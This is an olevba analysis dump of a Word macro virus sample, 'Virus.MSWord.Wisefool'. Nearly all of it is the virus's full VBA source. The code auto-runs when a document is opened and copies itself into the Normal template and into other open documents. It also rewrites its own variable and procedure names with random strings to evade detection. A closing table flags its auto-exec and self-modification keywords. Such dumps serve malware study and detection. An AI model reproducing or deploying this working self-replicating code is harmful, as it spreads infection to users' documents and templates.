olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wisefool
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wisefool - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub document_open()
Call ipnvx8mnu2xhs6jwsl8ded
Call skl9mqvoaggfjz50u43dg
End Sub
-------------------------------------------------------------------------------
VBA MACRO xkd8gnbb3tcr1ax0z.bas 
in file: Virus.MSWord.Wisefool - OLE stream: 'Macros/VBA/xkd8gnbb3tcr1ax0z'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'wise men say, only fools rush in.
'but i cant help falling in love with you...

Public Sub ipnvx8mnu2xhs6jwsl8ded()
On Error Resume Next
Dim i6kt4q3svd64zc0p As String
i6kt4q3svd64zc0p = ThisDocument.Path & "\"
If InStr(i6kt4q3svd64zc0p, "\\") Then i6kt4q3svd64zc0p = ThisDocument.Path
Call tnkkjmc8cxg7hjlfxh3roguoh
End Sub
Public Sub tnkkjmc8cxg7hjlfxh3roguoh()
On Error Resume Next
Dim t7r1zadf0q2wl As Boolean
Dim ao9bls7g8xgwve2d58o8eanl2 As String
Dim mpx9jypwc9tuhuy5xip As Integer
Dim kr8ch3bbmoq As Integer
Dim c8wklzjmwuir00sx7q4p7i As Integer
Dim gqmyn3rz419kuz18nk5 As Integer
Dim nwaf9urrqtjot5nmxqsm5o0 As Integer
Dim pn2voy6ttkk40i2f1ht3tsn1 As Integer
Dim d4aebjvwbcizm7h49l As Boolean

With Word.NormalTemplate

t7r1zadf0q2wl = False
For mpx9jypwc9tuhuy5xip = 1 To .VBProject.vbcomponents.Count
DoEvents
If .VBProject.vbcomponents.Item(mpx9jypwc9tuhuy5xip).codemodule.lines(1, 1) = "'wise men say, only fools rush in." Then
t7r1zadf0q2wl = True
Exit For
End If
Next mpx9jypwc9tuhuy5xip

If t7r1zadf0q2wl = True Then Exit Sub

ao9bls7g8xgwve2d58o8eanl2 = ym8o101zu86
.VBProject.vbcomponents.Add (1)
kr8ch3bbmoq = .VBProject.vbcomponents.Count
.VBProject.vbcomponents(kr8ch3bbmoq).Name = ao9bls7g8xgwve2d58o8eanl2

gqmyn3rz419kuz18nk5 = 0
For c8wklzjmwuir00sx7q4p7i = 1 To ThisDocument.VBProject.vbcomponents.Count
DoEvents
If ThisDocument.VBProject.vbcomponents(c8wklzjmwuir00sx7q4p7i).codemodule.lines(1, 1) = "'wise men say, only fools rush in." Then
gqmyn3rz419kuz18nk5 = c8wklzjmwuir00sx7q4p7i
Exit For
End If
Next c8wklzjmwuir00sx7q4p7i
If gqmyn3rz419kuz18nk5 = 0 Then Exit Sub

For nwaf9urrqtjot5nmxqsm5o0 = 1 To ThisDocument.VBProject.vbcomponents.Item(gqmyn3rz419kuz18nk5).codemodule.countoflines
DoEvents
Call .VBProject.vbcomponents(kr8ch3bbmoq).codemodule.insertlines(nwaf9urrqtjot5nmxqsm5o0, ThisDocument.VBProject.vbcomponents.Item(gqmyn3rz419kuz18nk5).codemodule.lines(nwaf9urrqtjot5nmxqsm5o0, 1))
Next nwaf9urrqtjot5nmxqsm5o0

d4aebjvwbcizm7h49l = False
For pn2voy6ttkk40i2f1ht3tsn1 = 1 To .VBProject.vbcomponents(1).codemodule.countoflines
If LCase(.VBProject.vbcomponents(1).codemodule.lines(pn2voy6ttkk40i2f1ht3tsn1, 1)) = LCase("private sub document_open()") Then
d4aebjvwbcizm7h49l = True
Call .VBProject.vbcomponents(1).codemodule.insertlines(pn2voy6ttkk40i2f1ht3tsn1 + 1, "call ifx83reguehrycmd5")
End If
Next pn2voy6ttkk40i2f1ht3tsn1

If d4aebjvwbcizm7h49l = False Then
Call .VBProject.vbcomponents(1).codemodule.insertlines(1, "private sub document_open()")
Call .VBProject.vbcomponents(1).codemodule.insertlines(2, "call ifx83reguehrycmd5")
Call .VBProject.vbcomponents(1).codemodule.insertlines(3, "end sub")
End If
.Save
End With
End Sub
Public Sub ifx83reguehrycmd5()
On Error Resume Next
Dim rmmd5n3bl9kad As Integer
Dim jlhtr8m486dfp56 As String
Dim dzan2ea4pvwuynjo0ihsvxr9 As Integer
Dim uqs7qt3aoxpfyddwjvmo7o As String
Dim n64iyf07eq2f8duq As Integer
Dim rcgme18870p As Integer
Dim skts5793kupe24h As Integer
Dim webz0qr0fo8l8n1i194g As Integer
Dim h0gkiq3chip63mnaerxqc9 As Integer
Dim yb26am55f9a5l7rpd6jc7gnbb As Integer
Dim ulrzjwizbjb06igwkswt As Integer
Dim cetu1h4ozlp492nkkjmc As String
Dim bxg7hjlfxh3roguohrymmd5n As Boolean
Dim al9kadvnlhtr8m486dfp As Integer

dzan2ea4pvwuynjo0ihsvxr9 = Word.Documents.Count
uqs7qt3aoxpfyddwjvmo7o = ym8o101zu86
With Word.Documents.Item(dzan2ea4pvwuynjo0ihsvxr9)

For yb26am55f9a5l7rpd6jc7gnbb = 1 To .VBProject.vbcomponents.Count
DoEvents
If .VBProject.vbcomponents.Item(yb26am55f9a5l7rpd6jc7gnbb).codemodule.lines(1, 1) = "'wise men say, only fools rush in." Then
bxg7hjlfxh3roguohrymmd5n = False
GoTo done:
End If
Next yb26am55f9a5l7rpd6jc7gnbb

h0gkiq3chip63mnaerxqc9 = 0
For webz0qr0fo8l8n1i194g = 1 To ThisDocument.VBProject.vbcomponents.Count
DoEvents
If ThisDocument.VBProject.vbcomponents(webz0qr0fo8l8n1i194g).codemodule.lines(1, 1) = "'wise men say, only fools rush in." Then
h0gkiq3chip63mnaerxqc9 = webz0qr0fo8l8n1i194g
Exit For
End If
Next webz0qr0fo8l8n1i194g
If h0gkiq3chip63mnaerxqc9 = 0 Then GoTo endme:

.VBProject.vbcomponents.Add (1)
ulrzjwizbjb06igwkswt = .VBProject.vbcomponents.Count
.VBProject.vbcomponents(ulrzjwizbjb06igwkswt).Name = uqs7qt3aoxpfyddwjvmo7o

For skts5793kupe24h = 1 To ThisDocument.VBProject.vbcomponents.Item(h0gkiq3chip63mnaerxqc9).codemodule.countoflines
DoEvents
Call .VBProject.vbcomponents(ulrzjwizbjb06igwkswt).codemodule.insertlines(skts5793kupe24h, ThisDocument.VBProject.vbcomponents.Item(h0gkiq3chip63mnaerxqc9).codemodule.lines(skts5793kupe24h, 1))
Next skts5793kupe24h

Dim wcifzan2ea4pvwuynjo0ih As Boolean
wcifzan2ea4pvwuynjo0ih = False
For al9kadvnlhtr8m486dfp = 1 To .VBProject.vbcomponents(1).codemodule.countoflines
If LCase(.VBProject.vbcomponents(1).codemodule.lines(al9kadvnlhtr8m486dfp, 1)) = LCase("private sub document_open()") Then
Call .VBProject.vbcomponents(1).codemodule.insertlines(al9kadvnlhtr8m486dfp + 1, "call ipnvx8mnu2xhs6jwsl8ded")
Call .VBProject.vbcomponents(1).codemodule.insertlines(al9kadvnlhtr8m486dfp + 2, "call skl9mqvoaggfjz50u43dg")
wcifzan2ea4pvwuynjo0ih = True
Exit For
End If
Next al9kadvnlhtr8m486dfp
If wcifzan2ea4pvwuynjo0ih = False Then
Call .VBProject.vbcomponents(1).codemodule.insertlines(1, "private sub document_open()")
Call .VBProject.vbcomponents(1).codemodule.insertlines(2, "call ipnvx8mnu2xhs6jwsl8ded")
Call .VBProject.vbcomponents(1).codemodule.insertlines(3, "call skl9mqvoaggfjz50u43dg")
Call .VBProject.vbcomponents(1).codemodule.insertlines(4, "end sub")
End If

bxg7hjlfxh3roguohrymmd5n = True
done:
.Save
End With

Exit Sub
endme:
Err.Clear
End Sub

Public Function efqtvp7hc2(g7i9btbjfrp6k2wt2dn3t1g As String) As String
On Error Resume Next
Dim slz492ntuswc As String
slz492ntuswc = Trim(g7i9btbjfrp6k2wt2dn3t1g)
slz492ntuswc = Replace(slz492ntuswc, vbTab, "")
Do While Left(slz492ntuswc, 1) = " "
slz492ntuswc = Right(slz492ntuswc, Len(slz492ntuswc) - 1)
Loop
efqtvp7hc2 = slz492ntuswc
End Function
Public Function ym8o101zu86() As String
On Error Resume Next
Dim l5or1ymvddw
Dim au9tam5nuq4r8w485doz
Dim wbso0aw2ekcyvvuynsx9rq
Dim pxr9sdczs7zt30yxop8d
Static vargenarray As Variant
MsgBox UBound(vargenarray)
au9tam5nuq4r8w485doz = "abcdefghijklmnopqrstuvwxyz1234567890"
Randomize
Do
l5or1ymvddw = Int(Rnd * 25 + 1)
Loop Until l5or1ymvddw > 8
For wbso0aw2ekcyvvuynsx9rq = 1 To l5or1ymvddw
If wbso0aw2ekcyvvuynsx9rq = 1 Then
Randomize
pxr9sdczs7zt30yxop8d = Mid(au9tam5nuq4r8w485doz, Int(Rnd * 26 + 1), 1)
Else
Randomize
pxr9sdczs7zt30yxop8d = pxr9sdczs7zt30yxop8d & Mid(au9tam5nuq4r8w485doz, Int(Rnd * Len(au9tam5nuq4r8w485doz) + 1), 1)
End If

Next
ym8o101zu86 = pxr9sdczs7zt30yxop8d
End Function
Public Sub skl9mqvoaggfjz50u43dg(Optional fliq34ijp7sdoafsyqc009c2 As Boolean, Optional um6v79a6m7rgd6kd As Integer)
On Error Resume Next
Dim xsxag9urrqujfk6 As Integer
Dim cortn5oazw As Integer
Dim uvpy7utlbu As String
Dim x59ytyjsr3682itod13g14d As Integer
Dim yzp9on7t6wygz73fdt9p As Integer
Dim tbphn51lm9mqwoa As Integer
Dim ejz50u44egicu5zocdrb As Integer
Dim iaj22jpyivhxas As String
Dim grvs1cmrsz As String
Dim qxko381mij As String
Dim afkweepikewg2znftng As String
Dim tfy3bix7xo As Integer
Dim jl6s5uxfx62dbr7nifnz0ogm As String
Dim enbb3tcr1ax0z3kca7igwbs As Integer
Dim o35etu285ozcq4zs As Variant
Dim c9dy87hkmgx94sfhvf As Variant
Dim sdne5n43l9kbdvelhu As Integer
Dim yn5yw5fq6w3jf As Variant
Dim tn26b5pwwvyejo0iitv As Variant
Dim m0je4rs7qt42pyggz As Variant
ReDim m0je4rs7qt42pyggz(0)
ReDim yn5yw5fq6w3jf(0)
ReDim c9dy87hkmgx94sfhvf(0)
ReDim o35etu285ozcq4zs(0)
Dim cxawcp8pxt6u0y7a8fr278 As Integer
Dim cz4hmf2xyx1qv1but5x As Integer

cxawcp8pxt6u0y7a8fr278 = 0
For cz4hmf2xyx1qv1but5x = 1 To ThisDocument.VBProject.vbcomponents.Count
DoEvents
If ThisDocument.VBProject.vbcomponents(cz4hmf2xyx1qv1but5x).codemodule.lines(1, 1) = "'wise men say, only fools rush in." Then
cxawcp8pxt6u0y7a8fr278 = cz4hmf2xyx1qv1but5x
Exit For
End If
Next cz4hmf2xyx1qv1but5x
If cxawcp8pxt6u0y7a8fr278 = 0 Then Exit Sub

With ThisDocument.VBProject.vbcomponents(cxawcp8pxt6u0y7a8fr278)
For xsxag9urrqujfk6 = 1 To .codemodule.countoflines

uvpy7utlbu = efqtvp7hc2(.codemodule.lines(xsxag9urrqujfk6, 1))
If InStr(LCase(uvpy7utlbu), LCase(" sub ")) Then
Erase yn5yw5fq6w3jf
Erase o35etu285ozcq4zs
ReDim yn5yw5fq6w3jf(0)
ReDim o35etu285ozcq4zs(0)

If InStr(LCase(uvpy7utlbu), Chr(34)) Then GoTo skip:
If InStr(LCase(uvpy7utlbu), "(") = 0 Then GoTo skip:
If InStr(LCase(uvpy7utlbu), ")") = 0 Then GoTo skip:
If Left(LCase(uvpy7utlbu), 1) = "'" Then GoTo skip:

x59ytyjsr3682itod13g14d = InStr(LCase(uvpy7utlbu), " sub ") + Len(" sub ")
yzp9on7t6wygz73fdt9p = InStr(x59ytyjsr3682itod13g14d, LCase(uvpy7utlbu), "(")
iaj22jpyivhxas = Mid(uvpy7utlbu, x59ytyjsr3682itod13g14d, yzp9on7t6wygz73fdt9p - x59ytyjsr3682itod13g14d)
ejz50u44egicu5zocdrb = InStr(yzp9on7t6wygz73fdt9p, LCase(uvpy7utlbu), ")")
qxko381mij = Mid(uvpy7utlbu, yzp9on7t6wygz73fdt9p + 1, ejz50u44egicu5zocdrb - yzp9on7t6wygz73fdt9p)
If qxko381mij <> ")" Then
If qxko381mij <> "" Then
enbb3tcr1ax0z3kca7igwbs = 1
tfy3bix7xo = 1
Do While InStr(enbb3tcr1ax0z3kca7igwbs, qxko381mij, " ")
DoEvents
tfy3bix7xo = InStr(enbb3tcr1ax0z3kca7igwbs, qxko381mij, " ")
jl6s5uxfx62dbr7nifnz0ogm = Mid(qxko381mij, enbb3tcr1ax0z3kca7igwbs, tfy3bix7xo - enbb3tcr1ax0z3kca7igwbs)
If LCase(jl6s5uxfx62dbr7nifnz0ogm) = LCase("optional") Then
enbb3tcr1ax0z3kca7igwbs = enbb3tcr1ax0z3kca7igwbs + 9
tfy3bix7xo = InStr(enbb3tcr1ax0z3kca7igwbs, qxko381mij, " ")
jl6s5uxfx62dbr7nifnz0ogm = Mid(qxko381mij, enbb3tcr1ax0z3kca7igwbs, tfy3bix7xo - enbb3tcr1ax0z3kca7igwbs)
End If
If LCase(jl6s5uxfx62dbr7nifnz0ogm) = LCase("byval") Then
enbb3tcr1ax0z3kca7igwbs = enbb3tcr1ax0z3kca7igwbs + 6
tfy3bix7xo = InStr(enbb3tcr1ax0z3kca7igwbs, qxko381mij, " ")
jl6s5uxfx62dbr7nifnz0ogm = Mid(qxko381mij, enbb3tcr1ax0z3kca7igwbs, tfy3bix7xo - enbb3tcr1ax0z3kca7igwbs)
End If
enbb3tcr1ax0z3kca7igwbs = InStr(tfy3bix7xo, qxko381mij, ",") + 2
If enbb3tcr1ax0z3kca7igwbs = 2 Then enbb3tcr1ax0z3kca7igwbs = InStr(tfy3bix7xo, qxko381mij, ")")
ReDim Preserve o35etu285ozcq4zs(UBound(o35etu285ozcq4zs) + 1)
o35etu285ozcq4zs(UBound(o35etu285ozcq4zs)) = jl6s5uxfx62dbr7nifnz0ogm & ":" & ym8o101zu86
Loop
End If
End If

Dim obvgf3u93v6c11rrag As Integer
yn5yw5fq6w3jf = dqyqokxvbz8b9gst9(xsxag9urrqujfk6, obvgf3u93v6c11rrag)
x = itxu3eotu2heyzmq503oll(yn5yw5fq6w3jf, o35etu285ozcq4zs, xsxag9urrqujfk6, obvgf3u93v6c11rrag)
ReDim Preserve m0je4rs7qt42pyggz(UBound(m0je4rs7qt42pyggz) + 1)
m0je4rs7qt42pyggz(UBound(m0je4rs7qt42pyggz)) = iaj22jpyivhxas & ":" & ym8o101zu86
End If
If InStr(LCase(uvpy7utlbu), LCase(" function ")) Then
Erase yn5yw5fq6w3jf
Erase o35etu285ozcq4zs
ReDim yn5yw5fq6w3jf(0)
ReDim o35etu285ozcq4zs(0)

If InStr(LCase(uvpy7utlbu), Chr(34)) Then GoTo skip:
If InStr(LCase(uvpy7utlbu), "(") = 0 Then GoTo skip:
If InStr(LCase(uvpy7utlbu), ")") = 0 Then GoTo skip:
If Left(LCase(uvpy7utlbu), 1) = "'" Then GoTo skip:

x59ytyjsr3682itod13g14d = InStr(LCase(uvpy7utlbu), " function ") + Len(" function ")
yzp9on7t6wygz73fdt9p = InStr(x59ytyjsr3682itod13g14d, LCase(uvpy7utlbu), "(")
iaj22jpyivhxas = Mid(uvpy7utlbu, x59ytyjsr3682itod13g14d, yzp9on7t6wygz73fdt9p - x59ytyjsr3682itod13g14d)
ejz50u44egicu5zocdrb = InStr(yzp9on7t6wygz73fdt9p, LCase(uvpy7utlbu), ")")
qxko381mij = Mid(uvpy7utlbu, yzp9on7t6wygz73fdt9p + 1, ejz50u44egicu5zocdrb - yzp9on7t6wygz73fdt9p)
If qxko381mij <> ")" Then
If qxko381mij <> "" Then
enbb3tcr1ax0z3kca7igwbs = 1
tfy3bix7xo = 1
Do While InStr(enbb3tcr1ax0z3kca7igwbs, qxko381mij, " ")
DoEvents
tfy3bix7xo = InStr(enbb3tcr1ax0z3kca7igwbs, qxko381mij, " ")
jl6s5uxfx62dbr7nifnz0ogm = Mid(qxko381mij, enbb3tcr1ax0z3kca7igwbs, tfy3bix7xo - enbb3tcr1ax0z3kca7igwbs)
If LCase(jl6s5uxfx62dbr7nifnz0ogm) = LCase("optional") Then
enbb3tcr1ax0z3kca7igwbs = enbb3tcr1ax0z3kca7igwbs + 9
tfy3bix7xo = InStr(enbb3tcr1ax0z3kca7igwbs, qxko381mij, " ")
jl6s5uxfx62dbr7nifnz0ogm = Mid(qxko381mij, enbb3tcr1ax0z3kca7igwbs, tfy3bix7xo - enbb3tcr1ax0z3kca7igwbs)
End If
If LCase(jl6s5uxfx62dbr7nifnz0ogm) = LCase("byval") Then
enbb3tcr1ax0z3kca7igwbs = enbb3tcr1ax0z3kca7igwbs + 6
tfy3bix7xo = InStr(enbb3tcr1ax0z3kca7igwbs, qxko381mij, " ")
jl6s5uxfx62dbr7nifnz0ogm = Mid(qxko381mij, enbb3tcr1ax0z3kca7igwbs, tfy3bix7xo - enbb3tcr1ax0z3kca7igwbs)
End If
enbb3tcr1ax0z3kca7igwbs = InStr(tfy3bix7xo, qxko381mij, ",") + 2
If enbb3tcr1ax0z3kca7igwbs = 2 Then enbb3tcr1ax0z3kca7igwbs = InStr(tfy3bix7xo, qxko381mij, ")")
ReDim Preserve o35etu285ozcq4zs(UBound(o35etu285ozcq4zs) + 1)
o35etu285ozcq4zs(UBound(o35etu285ozcq4zs)) = jl6s5uxfx62dbr7nifnz0ogm & ":" & ym8o101zu86
Loop
End If
End If

yn5yw5fq6w3jf = dqyqokxvbz8b9gst9(xsxag9urrqujfk6, tbphn51lm9mqwoa, True)
x = itxu3eotu2heyzmq503oll(yn5yw5fq6w3jf, o35etu285ozcq4zs, xsxag9urrqujfk6, tbphn51lm9mqwoa)
ReDim Preserve m0je4rs7qt42pyggz(UBound(m0je4rs7qt42pyggz) + 1)
m0je4rs7qt42pyggz(UBound(m0je4rs7qt42pyggz)) = iaj22jpyivhxas & ":" & ym8o101zu86
End If

skip:
Next xsxag9urrqujfk6
End With
Dim ym8o101zu86 As Integer
Dim fliq34ijp7sdoafsyqc009cl As Integer
Dim xoeqsuo7qb1xp4xq18vvmc As String
Dim ajthtjm5vup31gvc As Integer
Dim ioydekrn9jwanj As Variant
Dim xwrwhqq2461hrm As String
Dim tfy3bix7xo As String
Dim jl6s5uxfx62dbr7nifnz0ogm As String

For ym8o101zu86 = 1 To ThisDocument.VBProject.vbcomponents.Count
For fliq34ijp7sdoafsyqc009cl = 1 To ThisDocument.VBProject.vbcomponents(ym8o101zu86).codemodule.countoflines
For ajthtjm5vup31gvc = LBound(m0je4rs7qt42pyggz) To UBound(m0je4rs7qt42pyggz)
If m0je4rs7qt42pyggz(ajthtjm5vup31gvc) = "" Then GoTo skipx:
ioydekrn9jwanj = Split(m0je4rs7qt42pyggz(ajthtjm5vup31gvc), ":")
tfy3bix7xo = ioydekrn9jwanj(0)
jl6s5uxfx62dbr7nifnz0ogm = ioydekrn9jwanj(1)
xwrwhqq2461hrm = LCase(ThisDocument.VBProject.vbcomponents(ym8o101zu86).codemodule.lines(fliq34ijp7sdoafsyqc009cl, 1))
xwrwhqq2461hrm = Replace(xwrwhqq2461hrm, tfy3bix7xo, jl6s5uxfx62dbr7nifnz0ogm)
Call ThisDocument.VBProject.vbcomponents(ym8o101zu86).codemodule.replaceline(fliq34ijp7sdoafsyqc009cl, xwrwhqq2461hrm)
skipx:
Next ajthtjm5vup31gvc
Next fliq34ijp7sdoafsyqc009cl
Next ym8o101zu86
Erase ioydekrn9jwanj
Erase o35etu285ozcq4zs
Erase yn5yw5fq6w3jf
Erase m0je4rs7qt42pyggz
Erase c9dy87hkmgx94sfhvf
ThisDocument.Save
End Sub
Public Function dqyqokxvbz8b9gst9(o5zobdrbenl0i As Integer, tjpyhvgx0r0hdqeujqu As Integer, Optional sblrsyfbvxjo2 As Boolean) As Variant
On Error Resume Next
Dim sliihlafkvedpijevf1zmet, epwkkbbu1, n7s9ltljfsp6u264bnn34aqdx As Integer
Dim pzcibxtutwmhm8pfqtvp7qc2y, wxr29wwndwck As Variant
Dim ftkn5wuq42hwdhe As Variant
Dim kzeflso0k As String
Dim aokdy6658xsxirr3 As String
Dim x1isnc12fz3cjy8yp9nm7t As Integer
Dim pygy73ecs8ojgo1apgn41k As Integer
Dim ymqvoaggf As String
Dim o43dgict5zobdrbenl0i11jpy As String
Dim ex0r0hdqeujqurzblrsyfb As String

ReDim ftkn5wuq42hwdhe(0)
ReDim pzcibxtutwmhm8pfqtvp7qc2y(0)
ReDim wxr29wwndwck(0)

Dim qjo28zliihlafkve As Integer
Dim fjevf1zmetmgpwkkbbu10s7 As Integer

qjo28zliihlafkve = 0
For fjevf1zmetmgpwkkbbu10s7 = 1 To ThisDocument.VBProject.vbcomponents.Count
DoEvents
If ThisDocument.VBProject.vbcomponents(fjevf1zmetmgpwkkbbu10s7).codemodule.lines(1, 1) = "'wise men say, only fools rush in." Then
qjo28zliihlafkve = fjevf1zmetmgpwkkbbu10s7
Exit For
End If
Next fjevf1zmetmgpwkkbbu10s7
If qjo28zliihlafkve = 0 Then Exit Function

With ThisDocument.VBProject.vbcomponents(qjo28zliihlafkve)
For sliihlafkvedpijevf1zmet = o5zobdrbenl0i To .codemodule.countoflines
CurLine = efqtvp7hc2(.codemodule.lines(sliihlafkvedpijevf1zmet, 1))
If sblrsyfbvxjo2 = True Then
If LCase(CurLine) = "end function" Then
tjpyhvgx0r0hdqeujqu = sliihlafkvedpijevf1zmet
Exit For
End If
End If

If LCase(CurLine) = "end sub" Then
tjpyhvgx0r0hdqeujqu = sliihlafkvedpijevf1zmet
Exit For
End If
If LCase(Left(CurLine, 3)) = "dim" Then
kzeflso0k = Right(CurLine, Len(CurLine) - 4)
pzcibxtutwmhm8pfqtvp7qc2y = Split(kzeflso0k, ",")
For n7s9ltljfsp6u264bnn34aqdx = LBound(pzcibxtutwmhm8pfqtvp7qc2y) To UBound(pzcibxtutwmhm8pfqtvp7qc2y)
If InStr(pzcibxtutwmhm8pfqtvp7qc2y(n7s9ltljfsp6u264bnn34aqdx), " ") = False Then

ReDim Preserve wxr29wwndwck(UBound(wxr29wwndwck) + 1)
wxr29wwndwck(UBound(wxr29wwndwck)) = pzcibxtutwmhm8pfqtvp7qc2y(n7s9ltljfsp6u264bnn34aqdx) & ":" & ym8o101zu86
Else
aokdy6658xsxirr3 = pzcibxtutwmhm8pfqtvp7qc2y(n7s9ltljfsp6u264bnn34aqdx)
If Left(aokdy6658xsxirr3, 1) = " " Then
aokdy6658xsxirr3 = Right(aokdy6658xsxirr3, Len(aokdy6658xsxirr3) - 1)
End If
If InStr(aokdy6658xsxirr3, " ") Then
aokdy6658xsxirr3 = Left(aokdy6658xsxirr3, InStr(aokdy6658xsxirr3, " "))
End If
aokdy6658xsxirr3 = Replace(aokdy6658xsxirr3, " ", "")
ReDim Preserve wxr29wwndwck(UBound(wxr29wwndwck) + 1)
wxr29wwndwck(UBound(wxr29wwndwck)) = aokdy6658xsxirr3 & ":" & ym8o101zu86
End If
Next n7s9ltljfsp6u264bnn34aqdx
End If
Next sliihlafkvedpijevf1zmet
End With


For x1isnc12fz3cjy8yp9nm7t = LBound(wxr29wwndwck) To UBound(wxr29wwndwck)
For pygy73ecs8ojgo1apgn41k = LBound(wxr29wwndwck) To UBound(wxr29wwndwck)
If x1isnc12fz3cjy8yp9nm7t = pygy73ecs8ojgo1apgn41k Then GoTo skipme:
ymqvoaggf = Right(wxr29wwndwck(pygy73ecs8ojgo1apgn41k), Len(wxr29wwndwck(pygy73ecs8ojgo1apgn41k)) - InStr(wxr29wwndwck(pygy73ecs8ojgo1apgn41k), ":"))
o43dgict5zobdrbenl0i11jpy = Right(wxr29wwndwck(x1isnc12fz3cjy8yp9nm7t), Len(wxr29wwndwck(x1isnc12fz3cjy8yp9nm7t)) - InStr(wxr29wwndwck(x1isnc12fz3cjy8yp9nm7t), ":"))
If LCase(ymqvoaggf) = LCase(o43dgict5zobdrbenl0i11jpy) Then
ex0r0hdqeujqurzblrsyfb = Left(wxr29wwndwck(x1isnc12fz3cjy8yp9nm7t), InStr(wxr29wwndwck(x1isnc12fz3cjy8yp9nm7t), ":"))
wxr29wwndwck(x1isnc12fz3cjy8yp9nm7t) = hx723x & ":" & ym8o101zu86
End If
skipme:
Next pygy73ecs8ojgo1apgn41k
Next x1isnc12fz3cjy8yp9nm7t


dqyqokxvbz8b9gst9 = wxr29wwndwck
End Function

Public Function itxu3eotu2heyzmq503oll(evi4e15ing3zzy2rmrcvlwy1u As Variant, x4v04w7d22sj3hq1nzpsa31 As Variant, z7m2imksu5jkqxue As Integer, ugtpi5aa0d3 As Integer, Optional uoxw8ac7nyti68l69 As String) As Boolean
On Error Resume Next
Dim c5udssbya14l4b8kix As Integer
Dim it6fums06prdrv2t As Variant
Dim io50ez98jlnhz05 As String
Dim eiwgjtqeo66ou4 As String
Dim tm3fxfniv As String
Dim kvzx6hrwx5kg23pt7c6r As Integer
Dim knqgkp2jju As Integer
Dim lj1k75skyr As Integer

Dim lqhh17eyb As Integer
Dim dqyqokxvbz8b9gst9 As Integer
Dim c5udssbya14l4b8kix As String
Dim it6fums06prdrv2t As String
Dim io50ez98jlnhz05 As String
Dim eiwgjtqeo66ou4 As Boolean
Dim tm3fxfniv As String
w00tw00t:
eiwgjtqeo66ou4 = False
For lqhh17eyb = LBound(evi4e15ing3zzy2rmrcvlwy1u) To UBound(evi4e15ing3zzy2rmrcvlwy1u)
    If evi4e15ing3zzy2rmrcvlwy1u(lqhh17eyb) <> "" Then
        For dqyqokxvbz8b9gst9 = LBound(x4v04w7d22sj3hq1nzpsa31) To UBound(x4v04w7d22sj3hq1nzpsa31)
            If x4v04w7d22sj3hq1nzpsa31(dqyqokxvbz8b9gst9) <> "" Then
                c5udssbya14l4b8kix = Right(evi4e15ing3zzy2rmrcvlwy1u(lqhh17eyb), Len(evi4e15ing3zzy2rmrcvlwy1u(lqhh17eyb)) - InStr(evi4e15ing3zzy2rmrcvlwy1u(lqhh17eyb), ":"))
                it6fums06prdrv2t = Right(x4v04w7d22sj3hq1nzpsa31(dqyqokxvbz8b9gst9), Len(x4v04w7d22sj3hq1nzpsa31(dqyqokxvbz8b9gst9)) - InStr(x4v04w7d22sj3hq1nzpsa31(dqyqokxvbz8b9gst9), ":"))
                If LCase(it6fums06prdrv2t) = LCase(c5udssbya14l4b8kix) Then
                   tm3fxfniv = Left(evi4e15ing3zzy2rmrcvlwy1u(lqhh17eyb), InStr(evi4e15ing3zzy2rmrcvlwy1u(lqhh17eyb), ":") - 1)
                   io50ez98jlnhz05 = tm3fxfniv & ":" & ym8o101zu86
                   eiwgjtqeo66ou4 = True
                   evi4e15ing3zzy2rmrcvlwy1u(lqhh17eyb) = io50ez98jlnhz05
                End If
            End If
        Next dqyqokxvbz8b9gst9
    End If
Next lqhh17eyb
If eiwgjtqeo66ou4 = True Then GoTo w00tw00t:

knqgkp2jju = 0
For lj1k75skyr = 1 To ThisDocument.VBProject.vbcomponents.Count
DoEvents
If ThisDocument.VBProject.vbcomponents(lj1k75skyr).codemodule.lines(1, 1) = "'wise men say, only fools rush in." Then
knqgkp2jju = lj1k75skyr
Exit For
End If
Next lj1k75skyr
If knqgkp2jju = 0 Then Exit Function

With ThisDocument.VBProject.vbcomponents(knqgkp2jju)
For c5udssbya14l4b8kix = z7m2imksu5jkqxue To ugtpi5aa0d3
CurLine = efqtvp7hc2(.codemodule.lines(c5udssbya14l4b8kix, 1))
For kvzx6hrwx5kg23pt7c6r = LBound(x4v04w7d22sj3hq1nzpsa31) To UBound(x4v04w7d22sj3hq1nzpsa31)
If x4v04w7d22sj3hq1nzpsa31(kvzx6hrwx5kg23pt7c6r) = "" Then GoTo skip1:
it6fums06prdrv2t = Split(x4v04w7d22sj3hq1nzpsa31(kvzx6hrwx5kg23pt7c6r), ":")
io50ez98jlnhz05 = it6fums06prdrv2t(0)
eiwgjtqeo66ou4 = it6fums06prdrv2t(1)
tm3fxfniv = LCase(.codemodule.lines(c5udssbya14l4b8kix, 1))
tm3fxfniv = Replace(tm3fxfniv, io50ez98jlnhz05, eiwgjtqeo66ou4)
Call .codemodule.replaceline(c5udssbya14l4b8kix, tm3fxfniv)
skip1:
Next kvzx6hrwx5kg23pt7c6r
For kvzx6hrwx5kg23pt7c6r = LBound(evi4e15ing3zzy2rmrcvlwy1u) To UBound(evi4e15ing3zzy2rmrcvlwy1u)
If evi4e15ing3zzy2rmrcvlwy1u(kvzx6hrwx5kg23pt7c6r) = "" Then GoTo skip2:
it6fums06prdrv2t = Split(evi4e15ing3zzy2rmrcvlwy1u(kvzx6hrwx5kg23pt7c6r), ":")
io50ez98jlnhz05 = it6fums06prdrv2t(0)
eiwgjtqeo66ou4 = it6fums06prdrv2t(1)
tm3fxfniv = LCase(.codemodule.lines(c5udssbya14l4b8kix, 1))
tm3fxfniv = Replace(tm3fxfniv, io50ez98jlnhz05, eiwgjtqeo66ou4)
Call .codemodule.replaceline(c5udssbya14l4b8kix, tm3fxfniv)
skip2:
Next kvzx6hrwx5kg23pt7c6r
Next c5udssbya14l4b8kix
End With
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
